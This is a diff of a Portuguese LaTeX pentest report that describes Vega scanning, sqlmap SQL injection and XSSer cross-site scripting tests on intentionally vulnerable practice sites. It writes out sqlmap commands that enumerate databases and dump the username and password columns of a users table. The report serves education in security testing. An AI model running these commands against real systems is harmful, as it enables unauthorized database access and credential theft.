@@ -424,7 +424,7 @@ Entretanto, mesmo com esta ferramenta proporcionando várias funcionalidades, nec
 Uma ferramenta que pode facilitar na hora de realizar ataques de \ac{XSS} é a ferramenta XSSer, a qual é automizada para detectar, explorar e reportar vulnerabilidades de \ac{XSS} em 
 aplicações \textit{web}. Para utilizar desta ferramenta é necessário ter a linguagem Python instalada e algumas bibliotecas específicas.
 
-Na Fig.~\ref{xsser} têm-se um exemplo do funcionamento da ferramenta XSSer.
+Na figura \ref{fig:xsser} têm-se um exemplo do funcionamento da ferramenta XSSer.
 
 \begin{figure}[H]
 \centering
@@ -448,19 +448,30 @@ para que haja um aproveitamento máximo dos testes de penetração.
 \label{ataques}
 
 Neste capítulo será apresentado os ataques realizados e algumas análises dos mesmos, bem como possíveis soluções para os problemas encontrados. Para a realização dos ataques será 
-utilizado algumas ferramentas auxiliares, como: Vega, sqlmap (ver seção~\ref{lampkali} para mais detalhes).
+utilizado algumas ferramentas auxiliares, como: \textit{Vega}, \textit{sqlmap} e \textit{XSSer} (ver seção~\ref{lampkali} para mais detalhes).
 
 \section{AMBIENTE DE TESTES E PLANO DE TESTES}
 
-Todos os testes aqui apresentados foram executados em \textit{sites} próprios para testes de penetração, ou seja, são \textit{sites} próprios para que seja feita os devidos 
-testes e com isso aprimorar habilidades sem nenhum tipo de dano. 
+Todos os testes aqui apresentados foram executados em \textit{sites} próprios para testes de penetração, ou seja, são \textit{sites} próprios para que sejam feitos os devidos 
+testes e com isso aprimorar habilidades sem nenhum tipo de dano a terceiros. Estes \textit{sites} são disponibilizados pela \cite{OWASP38:online},
+são eles: \url{www.testphp.vulnweb.com} e \url{www.hackthissite.org}.
 
-Também foi realizado os testes com auxílio de ferramentas específicas para cada tipo de ataque comentado na subseção \ref{principaisataques}. 
+Também foram realizados testes com auxílio de ferramentas específicas para cada tipo de ataque (comentado em \ref{principaisataques}). 
 
 
-\section{SESSÃO DE ATAQUES}
+\section{SESSÃO DE ATAQUES}\label{sec:attack}
 
-As Fig~\ref{fig:vega_hack} e \ref{fig:vega_acuart} representam as vulnerabilidades encontradas quando utilizado do Vega Scan (ver subseção \ref{ferramentas} para mais detalhes).
+Viabilizada por ferramentas \textit{open-source} já citadas em \ref{ferramentas}, a sessão de ataques seguiu a seguinte ordem lógica: 
+\begin{enumerate}
+ \item Análise das vulnerabilidades com o \textit{Vega};
+ \item Utilização do \textit{sqlmap} para execução de \textit{SQL Injection}; e
+ \item Utilização do \textit{XSSer} para execução de \textit{Cross Site Scripting}.
+\end{enumerate}
+
+\subsection{Análise de Vulnerabilidade com \textit{Vega}}
+
+As figuras \ref{fig:vega_hack} e \ref{fig:vega_acuart} representam as vulnerabilidades encontradas quando utilizado do \textit{Vega Scan}
+(ver \ref{ferramentas} para mais detalhes).
 
 \begin{figure}[H]
 \centering
@@ -472,87 +483,161 @@ As Fig~\ref{fig:vega_hack} e \ref{fig:vega_acuart} representam as vulnerabilidad
 \begin{figure}[H]
 \centering
 \includegraphics[width=0.8\textwidth]{imagens/vegascan_acuart.png}
-\caption{Vulnerabilidades do site:testphp.vulnweb.com. Fonte: Próprio autor}
+\caption{Vulnerabilidades do site: testphp.vulnweb.com. Fonte: Próprio autor}
 \label{fig:vega_acuart}
 \end{figure}
 
-\begin{lstlisting}[style=BashInputStyle]
-    $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=2%20--%20
-    -D acuart -T users --columns
-\end{lstlisting}
+O \textit{Vega} realiza então a classificação das ameaças como sendo de risco alto, médio ou baixo. Tendo então detectado um total de 
+1535 ameaças em \url{www.hackthissite.org} e 54 ameaças em \url{www.testphp.vulnweb.com}.
 
+\subsection{Ataques de \textit{SQL Injection}}\label{subsec:sql_injection}
+
+De acordo com a análise do \textit{Vega} dentre as 54 ameaças encontradas em \url{www.testphp.vulnweb.com} (figura \ref{fig:vega_acuart})
+existem 7 possíveis endereços vulneráveis à \textit{SQL Injection} e um dos possíveis endereços pode ser visualizado na figura 
+\ref{fig:vega_sqlinjection_acuart}.
 
 \begin{figure}[H]
 \centering
-\includegraphics[width=0.8\textwidth]{imagens/sqlmap_columnsnames_acuart.png}
-\caption{Nome das colunas de um \ac{BD}. Fonte: Próprio autor}
-\label{fig:XSS}
+\includegraphics[width=0.8\textwidth]{imagens/vegascan_sqlinjection_acuart.png}
+\caption{Endereço vulnerável em testphp.vulnweb.com. Fonte: Próprio autor}
+\label{fig:vega_sqlinjection_acuart}
 \end{figure}
 
-\begin{lstlisting}[style=BashInputStyle]
+Após obter através do \textit{Vega} o endereço onde será realizado o ataque, o próximo passo fora a utilização do \textit{sqlmap}
+para obter inicialmente o nome dos bancos de dados disponíveis.
+
+\begin{lstlisting}[caption={Comando para retornar a lista de bancos disponíveis},label={lst:db_disponivel},style=BashInputStyle]
     $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=2%20--%20
     --dbs --threads 3
 \end{lstlisting}
+
+Com o comando \ref{lst:db_disponivel} é possível obter a lista dos bancos de dados, como visto na figura \ref{fig:sqlmap_dbnames}.
 
 
 \begin{figure}[H]
 \centering
 \includegraphics[width=0.8\textwidth]{imagens/sqlmap_dbnames_acuart.png}
 \caption{Nome dos \ac{BD}. Fonte: Próprio autor}
-\label{fig:XSS}
+\label{fig:sqlmap_dbnames}
 \end{figure}
 
-\begin{lstlisting}[style=BashInputStyle]
-    $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=2%20--%20
-    --dbs --threads 3
-\end{lstlisting}
+Dentre os nomes identificados tem-se o banco \textit{information\_schema}, o qual costuma ser um banco de dados padrão do sistema. Logo, o foco
+dos ataques será o banco \textit{acuart}. Para isso executa-se então o comando \ref{lst:tables}.
 
-\begin{figure}[H]
-\centering
-\includegraphics[width=0.8\textwidth]{imagens/sqlmap_tablenames2_acuart.png}
-\caption{Nome das tabelas no \ac{BD}. Fonte: Próprio autor}
-\label{fig:XSS}
-\end{figure}
-
-\begin{lstlisting}[style=BashInputStyle]
+\begin{lstlisting}[caption={Comando para retornar a lista de tabelas},label={lst:tables},style=BashInputStyle]
     $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=2%20--%20
     --tables --threads 3
 \end{lstlisting}
 
+A figura \ref{fig:sqlmap_tablenames2} exemplifica o retorno da operação realizada.
+
+
 \begin{figure}[H]
 \centering
-\includegraphics[width=0.8\textwidth]{imagens/sqlmap_tablenames_acuart.png}
-\caption{. Fonte: Próprio autor}
-\label{fig:XSS}
+\includegraphics[width=0.4\textwidth]{imagens/sqlmap_tablenames2_acuart.png}
+\caption{Nome das tabelas no \ac{BD}. Fonte: Próprio autor}
+\label{fig:sqlmap_tablenames2}
 \end{figure}
 
-\begin{lstlisting}[style=BashInputStyle]
+Tendo então o nome das tabelas, é possível adicionar mais parâmetros ao comando \textit{sqlmap} para obter as colunas de uma determinada tabela,
+por exemplo. Simulando um sistema onde o banco de dados possui usuários cadastrados, é possível visualizar o nome \textit{users}, uma tabela
+promissora para conter o nome de usuário e senha para um possível \textit{login}.
+
+
+\begin{lstlisting}[caption={Comando para retornar as colunas da tabela users},label={lst:columns},style=BashInputStyle]
     $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=2%20--%20
-    --threads 3 -D acuart -T users -C pass --dump
+    -D acuart -T users --columns
 \end{lstlisting}
 
+Verificar os campos (colunas) dessa tabela com \textit{sqlmap} é fácil com o comando \ref{lst:columns}, sendo o resultado apresentado 
+na figura \ref{fig:sqlmap_columnsnames}.
+
 \begin{figure}[H]
 \centering
-\includegraphics[width=0.8\textwidth]{imagens/sqlmap_pass_acuart.png}
-\caption{. Fonte: Próprio autor}
-\label{fig:XSS}
+\includegraphics[width=0.3\textwidth]{imagens/sqlmap_columnsnames_acuart.png}
+\caption{Nome das colunas de um \ac{BD}. Fonte: Próprio autor}
+\label{fig:sqlmap_columnsnames}
 \end{figure}
 
-\begin{lstlisting}[style=BashInputStyle]
+Neste retorno observa-se os campos \textit{uname} e \textit{pass}, os quais provavelmente contém nome de usuário e senha para acesso ao perfil
+do usuário.
+
+Para verificar estes valores tem-se os comandos \ref{lst:dump_uname} e \ref{lst:dump_pass}. O retorno desses comandos estão expostos nas figuras
+\ref{fig:dump_uname} e \ref{fig:dump_pass} respectivamente.
+
+\begin{lstlisting}[caption={Comando para retornar os valores da coluna \textit{uname}},label={lst:dump_uname},style=BashInputStyle]
     $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=2%20--%20
     --threads 3 -D acuart -T users -C uname --dump
 \end{lstlisting}
 
+\begin{lstlisting}[caption={Comando para retornar os valores da coluna \textit{pass}},label={lst:dump_pass},style=BashInputStyle]
+    $ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=2%20--%20
+    --threads 3 -D acuart -T users -C pass --dump
+\end{lstlisting}
+
+
 \begin{figure}[H]
 \centering
 \includegraphics[width=0.8\textwidth]{imagens/sqlmap_uname_acuart.png}
-\caption{. Fonte: Próprio autor}
-\label{fig:XSS}
+\caption{\textit{Dump} do campo \textit{uname} da tabela \textit{users} com \textit{sqlmap}. Fonte: Próprio autor}
+\label{fig:dump_uname}
 \end{figure}
+
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{imagens/sqlmap_pass_acuart.png}
+\caption{\textit{Dump} do campo \textit{pass} da tabela \textit{users} com \textit{sqlmap}. Fonte: Próprio autor}
+\label{fig:dump_pass}
+\end{figure}
+
+A partir da integração entre análise de vulnerabilidade e ataques de teste foi possível obter os nomes de usuário e suas respectivas
+senhas de acesso ao endereço \url{www.testphp.vulnweb.com}.
+
+\subsection{Ataques de \textit{Cross Site Scripting}}\label{subsec:xss}
+
+De acordo com a análise do \textit{Vega} dentre as 1535 ameaças encontradas em \url{www.hackthissite.org} (figura \ref{fig:vega_hack})
+existem 23 possíveis endereços vulneráveis à \textit{Cross Site Scripting}. Os próximos passos se dão com o uso do \textit{XSSer}.
+
+Através do endereço vulnerável disponibilizado pelo \textit{Vega} em sua análise de vulnerabilidade, inicia-se o \textit{XSSer} para iniciar
+os testes de inserção de \textit{scripts}. Inúmeros casos de teste são executados, como é possível observar na figura \ref{fig:xss_hack}.
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{imagens/xsser_xss_hackthissite.png}
+\caption{\textit{Scripts} inseridos em testes com \textit{XSSer}. Fonte: Próprio autor}
+\label{fig:xss_hack}
+\end{figure}
+
+Ao final da execução, o \textit{XSSer} fornece dados estatísticos com relação aos testes realizados (figura \ref{fig:math_hack}).
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.8\textwidth]{imagens/xsser_estatistica_hackthissite.png}
+\caption{Dados estatísticos dos testes com \textit{XSSer}. Fonte: Próprio autor}
+\label{fig:math_hack}
+\end{figure}
+
+Diferente da coleta de dados restritos observada em \ref{subsec:sql_injection}, os testes de inserção com \textit{XSSer} modificam a página
+com \textit{scripts} de outra origem que não o servidor de \url{www.hackthissite.org}.
 
 \section{ANÁLISE DOS RESULTADOS}
 
+Os ataques realizados em \ref{sec:attack} foram bem sucedidos, a manipulação de dados (vide \ref{subsec:sql_injection}) se mostrou 100\% efetiva
+e a inserção de \textit{scripts} de outra origem (\ac{XSS}) (vide \ref{subsec:xss}) obteve 82\% de sucesso em seus casos de teste 
+(figura \ref{fig:math_hack}).
+
+A detecção das vulnerabilidades pelo \textit{Vega} garantem a possível manipulação do banco de dados (vide \ref{subsec:sql_injection}) e inserção
+de \textit{scripts} maliciosos de origem desconhecida (vide \ref{subsec:xss}) por atacantes que podem se prover de acesso de escrita e leitura
+para dados que não deveriam ter permissão (\textit{SQL Injection}) ou então manipular o conteúdo do site, suas funções e aparência, manipular a
+aplicação sem conhecimento do usuário, retransmitir \textit{cookies} e outras funcionalidades.
+
+
 \section{SOLUÇÕES PROPOSTAS}
+
+
+
+
 
 \begin{comment}
 
